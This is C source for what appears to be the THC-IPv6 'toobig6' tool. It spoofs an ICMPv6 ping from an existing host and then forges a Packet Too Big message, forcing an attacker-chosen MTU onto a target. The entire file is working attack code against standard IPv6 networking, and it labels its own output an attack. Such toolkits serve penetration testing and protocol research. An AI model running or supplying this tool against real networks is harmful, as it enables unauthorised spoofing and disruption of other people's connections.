#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

void help(char *prg) {
  printf("%s %s (c) 2020 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-u] interface target-ip existing-ip mtu [hop-limit]\n\n",
         prg);
  printf("Implants the specified mtu on the target.\n");
  printf(
      "If the TTL of the target is not 64, then specify this as the last "
      "option.\n");
  printf(
      "Option -u will send the TooBig without the spoofed ping6 from "
      "existing-ip.\n");
  //  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  unsigned char *pkt = NULL, buf[65536];
  unsigned char *mac6 = NULL, *src6, *target6;
  int            rmtu, buf_len = 0, ttl = 63, offset = 14;
  int            pkt_len = 0;
  thc_ipv6_hdr * ipv6;
  char *         interface;
  unsigned int   mtu, related = 1;

  if (argc > 3 && strncmp(argv[1], "-u", 2) == 0) {
    related = 0;
    argc--;
    argv++;
  }

  if (argc < 5 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  interface = argv[1];
  target6 = thc_resolve6(argv[2]);
  src6 = thc_resolve6(argv[3]);
  mtu = atoi(argv[4]);
  rmtu = thc_get_mtu(interface);

  if (do_hdr_size) offset = do_hdr_size;

  if (rmtu < 1280 || rmtu > 65530) {
    fprintf(stderr, "Error: mtu size invalid on interface %s\n", interface);
    exit(-1);
  }

  if (argc > 5) ttl = atoi(argv[5]);
  if (ttl < 0 || ttl > 255) ttl = 64;

  mac6 = thc_get_own_mac(interface);
  if (mtu > 47) buf_len = mtu - 47;
  if (buf_len < 0) buf_len = rmtu - 48 - offset;

  if (rmtu - 48 < buf_len) buf_len = rmtu - 48;

  memset(buf, 'A', sizeof(buf));
  if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, src6,
                                      target6, 0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_PINGREQUEST, 0, 0xfacebabe,
                    (unsigned char *)&buf, buf_len, 0) < 0)
    return -1;
  if (thc_generate_pkt(interface, NULL, NULL, pkt, &pkt_len) < 0) {
    fprintf(stderr, "Error: Can not generate packet, exiting ...\n");
    exit(-1);
  }
  if (related)
    if (thc_send_pkt(interface, pkt, &pkt_len) < 0) {
      fprintf(stderr, "Error: Can not send packet, exiting ...\n");
      exit(-1);
    }

  usleep(50000);
  ipv6 = (thc_ipv6_hdr *)pkt;
  thc_inverse_packet(ipv6->pkt + offset, ipv6->pkt_len - offset);
  ipv6->pkt[offset + 7] = (unsigned char)ttl;
  thc_toobig6(interface, src6, mac6, NULL, mtu, ipv6->pkt + offset,
              ipv6->pkt_len - offset);
  printf("toobig6 attack on %s for target %s and MTU %s sent.\n", argv[2],
         argv[3], argv[4]);

  return 0;
}
